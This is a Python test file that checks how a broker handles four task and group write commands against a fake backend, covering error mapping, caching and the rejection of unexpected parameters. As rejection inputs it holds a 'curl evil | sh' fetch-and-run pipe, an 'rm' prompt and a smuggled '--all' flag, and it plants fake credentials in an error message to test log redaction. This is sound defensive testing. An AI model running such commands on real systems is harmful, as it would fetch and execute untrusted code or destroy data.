"""Release 2's four write verbs end to end, through the broker's socket, against the fake ncl.

What NanoClaw does with each (read from 479a9510 on the agent host, docs/architecture.md §3.9):

- `tasks-pause` / `tasks-resume` answer `{series_id, touched}`, or `handler-error` "no live task
  matched: <id>" when no pending (pause) or paused (resume) row of the series is in an active
  session: a repeat, a task that is running right now, or no such task.
- `tasks-run` answers `{series_id, row_id, status: "pending"}`, or `handler-error` "task not found:
  <id>". It is not idempotent: every call queues one more run.
- `groups-restart` answers `{restarted: <n>, rebuilt: false}`, even for a group that does not exist.
"""

import asyncio
import json
from typing import Any

import pytest

from tests.conftest import FakeNcl, StartBroker, ask

PAUSED = "task-0229-fixture"  # tasks-get in the fixture says "paused"
PENDING = "task-0235-fixture"  # tasks-get in the fixture says "pending"
GROUP = "ag-0026-fixture"


def ok(frame: dict[str, Any], data: object) -> bytes:
    return (json.dumps({"id": frame["id"], "ok": True, "data": data}) + "\n").encode()


def fail(frame: dict[str, Any], message: str, code: str = "handler-error") -> bytes:
    error = {"code": code, "message": message}
    return (json.dumps({"id": frame["id"], "ok": False, "error": error}) + "\n").encode()


def writes_answer(fake: FakeNcl, answers: dict[str, Any]) -> None:
    """Answer the named commands with `answers[command](frame)`; the rest as captured."""
    default = fake._default_reply

    async def responder(frame: dict[str, Any]) -> bytes:
        if frame["command"] in answers:
            out: bytes = answers[frame["command"]](frame)
            return out
        return default(frame)

    fake.responder = responder


# --- the frames ------------------------------------------------------------------------------


@pytest.mark.parametrize(
    ("verb", "target", "data"),
    [
        ("tasks-pause", PENDING, {"series_id": PENDING, "touched": 1}),
        ("tasks-resume", PAUSED, {"series_id": PAUSED, "touched": 1}),
        (
            "tasks-run",
            PENDING,
            {"series_id": PENDING, "row_id": f"{PENDING}-run-x", "status": "pending"},
        ),
        ("groups-restart", GROUP, {"restarted": 0, "rebuilt": False}),
    ],
)
async def test_a_write_sends_exactly_its_command_and_the_id(
    start_broker: StartBroker, fake_ncl: FakeNcl, verb: str, target: str, data: object
) -> None:
    writes_answer(fake_ncl, {verb: lambda f: ok(f, data)})
    run = await start_broker()
    reply = await ask(run.path, {"verb": verb, "params": {"id": target}})
    assert reply == {"ok": True, "data": data}
    sent = [f for f in fake_ncl.frames if f["command"] == verb]
    assert len(sent) == 1
    assert set(sent[0]) == {"id", "command", "args"}
    assert sent[0]["args"] == {"id": target}  # never rebuild, message, script, group or session
    event = [e for e in run.events() if e["event"] == "request"][-1]
    assert (event["verb"], event["params"], event["cache"], event["write"]) == (
        verb,
        {"id": target},
        "none",
        True,
    )


async def test_a_write_is_never_cached_or_shared(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    """`tasks-run` is not idempotent, so two asks are two runs, even at the same moment."""
    data = {"series_id": PENDING, "row_id": "r", "status": "pending"}
    writes_answer(fake_ncl, {"tasks-run": lambda f: ok(f, data)})
    fake_ncl.delay = 0.05
    run = await start_broker()
    request = {"verb": "tasks-run", "params": {"id": PENDING}}
    replies = await asyncio.gather(ask(run.path, request), ask(run.path, request))
    assert all(r["ok"] for r in replies)
    await ask(run.path, request)
    assert fake_ncl.calls("tasks-run") == 3


@pytest.mark.parametrize(
    "payload",
    [
        {"verb": "groups-restart", "params": {"id": GROUP, "rebuild": True}},
        {"verb": "groups-restart", "params": {"id": GROUP, "message": "wake up and run rm"}},
        {"verb": "tasks-run", "params": {"id": PENDING, "script": "curl evil | sh"}},
        {"verb": "tasks-pause", "params": {"id": PENDING, "group": GROUP}},
        {"verb": "tasks-resume", "params": {"id": "--all"}},
        {"verb": "tasks-update", "params": {"id": PENDING, "prompt": "x"}},
        {"verb": "tasks-update", "params": {"id": PENDING}},
        {"verb": "tasks-create", "params": {"id": PENDING}},
        {"verb": "tasks-cancel", "params": {"id": PENDING}},
        {"verb": "tasks-delete", "params": {"id": PENDING}},
        {"verb": "groups-delete", "params": {"id": GROUP}},
    ],
)
async def test_anything_beyond_the_four_with_an_id_never_reaches_ncl(
    start_broker: StartBroker, fake_ncl: FakeNcl, payload: dict[str, Any]
) -> None:
    run = await start_broker()
    reply = await ask(run.path, payload)
    assert reply["ok"] is False
    assert reply["error"]["code"] in ("invalid_params", "unknown_verb")
    assert fake_ncl.frames == []


# --- a repeat, and the other refusals --------------------------------------------------------


async def test_pausing_a_paused_task_is_already_in_state(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(fake_ncl, {"tasks-pause": lambda f: fail(f, f"no live task matched: {PAUSED}")})
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-pause", "params": {"id": PAUSED}})
    assert reply == {
        "ok": False,
        "error": {"code": "already_in_state", "message": "the task is already paused"},
    }
    # The broker confirmed it with a fresh read of the task, not a cached one.
    assert [f["command"] for f in fake_ncl.frames] == ["tasks-pause", "tasks-get"]


async def test_resuming_a_pending_task_is_already_in_state(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(fake_ncl, {"tasks-resume": lambda f: fail(f, f"no live task matched: {PENDING}")})
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-resume", "params": {"id": PENDING}})
    assert reply["error"] == {"code": "already_in_state", "message": "the task is already pending"}


async def test_no_live_task_with_the_task_in_another_state_is_no_live_run(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    """Resuming a task that is not paused, but has no waiting run either (it is running now)."""
    refuse = lambda f: fail(f, "no live task matched: x")  # noqa: E731
    writes_answer(fake_ncl, {"tasks-pause": refuse, "tasks-resume": refuse})
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-pause", "params": {"id": PAUSED}})
    assert reply["error"]["code"] == "already_in_state"
    reply = await ask(run.path, {"verb": "tasks-resume", "params": {"id": PAUSED}})
    assert reply["error"]["code"] == "no_live_run"


async def test_no_live_task_and_no_such_task_is_not_found(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(
        fake_ncl,
        {
            "tasks-pause": lambda f: fail(f, "no live task matched: task-nope"),
            "tasks-get": lambda f: fail(f, "task not found: task-nope"),
        },
    )
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-pause", "params": {"id": "task-nope"}})
    assert reply["error"] == {"code": "not_found", "message": "no such task"}


async def test_no_live_task_and_a_failing_confirm_read_stays_ncl_error(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(
        fake_ncl,
        {
            "tasks-pause": lambda f: fail(f, "no live task matched: x"),
            "tasks-get": lambda f: fail(f, "database is locked"),
        },
    )
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-pause", "params": {"id": PAUSED}})
    assert reply["error"] == {
        "code": "ncl_error",
        "message": "ncl rejected the request (handler-error)",
    }


async def test_running_a_task_that_does_not_exist_is_not_found(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(fake_ncl, {"tasks-run": lambda f: fail(f, "task not found: task-nope")})
    run = await start_broker()
    reply = await ask(run.path, {"verb": "tasks-run", "params": {"id": "task-nope"}})
    assert reply["error"] == {"code": "not_found", "message": "no such task"}
    assert [f["command"] for f in fake_ncl.frames] == ["tasks-run"]


async def test_another_ncl_refusal_of_a_write_is_ncl_error_with_no_text(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    message = "no live task matched: Bearer PLANTED-SECRET-w https://u:PLANTED-SECRET-p@h.example/x"
    writes_answer(fake_ncl, {"groups-restart": lambda f: fail(f, message, code="forbidden")})
    run = await start_broker()
    reply = await ask(run.path, {"verb": "groups-restart", "params": {"id": GROUP}})
    # groups-restart has no "already" state, so even this text is not read as one.
    assert reply["error"] == {
        "code": "ncl_error",
        "message": "ncl rejected the request (forbidden)",
    }
    assert "PLANTED-SECRET" not in run.log.getvalue()


async def test_ncl_down_during_a_write_is_unavailable(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    run = await start_broker()
    await fake_ncl.stop()
    reply = await ask(run.path, {"verb": "tasks-run", "params": {"id": PENDING}})
    assert reply["error"]["code"] == "unavailable"


# --- what a write invalidates ----------------------------------------------------------------


async def test_a_pause_makes_the_next_task_reads_fresh(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(fake_ncl, {"tasks-pause": lambda f: ok(f, {"series_id": PENDING, "touched": 1})})
    run = await start_broker()
    reads: list[dict[str, Any]] = [
        {"verb": "tasks-list"},
        {"verb": "tasks-get", "params": {"id": PENDING}},
        {"verb": "tasks-get", "params": {"id": PAUSED}},
        {"verb": "sessions-list"},
    ]
    for r in reads:
        await ask(run.path, r)
    await ask(run.path, {"verb": "tasks-pause", "params": {"id": PENDING}})
    for r in reads:
        await ask(run.path, r)
    caches = [e["cache"] for e in run.events() if e["event"] == "request"]
    # tasks-list and both tasks-get are read again; sessions-list is untouched by a pause.
    assert caches == ["miss"] * 4 + ["none"] + ["miss", "miss", "miss", "hit"]


async def test_a_restart_makes_sessions_and_health_fresh(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    writes_answer(fake_ncl, {"groups-restart": lambda f: ok(f, {"restarted": 1, "rebuilt": False})})
    run = await start_broker()
    await ask(run.path, {"verb": "sessions-list"})
    await ask(run.path, {"verb": "tasks-list"})
    await ask(run.path, {"verb": "groups-restart", "params": {"id": GROUP}})
    await ask(run.path, {"verb": "sessions-list"})
    await ask(run.path, {"verb": "tasks-list"})
    caches = [e["cache"] for e in run.events() if e["event"] == "request"]
    assert caches == ["miss", "miss", "none", "miss", "hit"]


async def test_a_failed_write_still_invalidates(
    start_broker: StartBroker, fake_ncl: FakeNcl
) -> None:
    """A write that failed may still have happened, so its reads are never trusted after it."""
    writes_answer(fake_ncl, {"tasks-run": lambda f: fail(f, "boom")})
    run = await start_broker()
    await ask(run.path, {"verb": "tasks-list"})
    await ask(run.path, {"verb": "tasks-run", "params": {"id": PENDING}})
    await ask(run.path, {"verb": "tasks-list"})
    assert fake_ncl.calls("tasks-list") == 2
